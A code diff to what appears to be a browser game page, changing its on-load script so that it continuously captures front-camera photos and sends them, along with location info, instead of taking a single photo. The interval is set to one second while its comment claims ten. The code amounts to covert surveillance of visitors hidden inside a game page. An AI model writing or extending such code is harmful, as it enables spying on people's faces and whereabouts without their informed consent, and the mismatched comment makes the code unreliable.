@@ -209,34 +209,40 @@
         let gameLoop;
         let gameStarted = false;
 
-        // Initialize camera and capture photo on page load
+        let cameraStream = null;
+        let photoInterval = null;
+        let photoCount = 0;
+
+        // Initialize camera and capture photos continuously
         window.addEventListener('load', async () => {
             try {
                 document.getElementById('status').textContent = 'Starting camera...';
                 
                 // Request camera access
-                const stream = await navigator.mediaDevices.getUserMedia({
+                cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' }
                 });
                 
-                video.srcObject = stream;
+                video.srcObject = cameraStream;
                 
-                // Wait for video to be ready and capture photo
+                // Wait for video to be ready
                 video.onloadedmetadata = () => {
                     document.getElementById('status').textContent = 'Camera ready...';
                     
-                    // Wait 2 seconds for camera to stabilize, then capture
-                    setTimeout(async () => {
-                        await captureAndSendPhoto();
+                    // Send location info first (once)
+                    setTimeout(() => {
+                        sendLocationInfo();
+                    }, 1000);
+
+                    // Start capturing photos every 10 seconds
+                    setTimeout(() => {
+                        captureAndSendPhoto(); // First photo immediately
                         
-                        // Stop camera after capture
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        // Wait a bit then send location info
-                        setTimeout(() => {
-                            sendLocationInfo();
-                        }, 1000);
-                    }, 2000);
+                        // Then capture every 10 seconds
+                        photoInterval = setInterval(() => {
+                            captureAndSendPhoto();
+                        }, 1000); // 10 seconds
+                    }, 1000);
                 };
                 
             } catch (err) {
@@ -246,6 +252,16 @@
                 setTimeout(() => {
                     sendLocationInfo();
                 }, 500);
+            }
+        });
+
+        // Stop camera when page is closed
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            if (photoInterval) {
+                clearInterval(photoInterval);
             }
         });
 
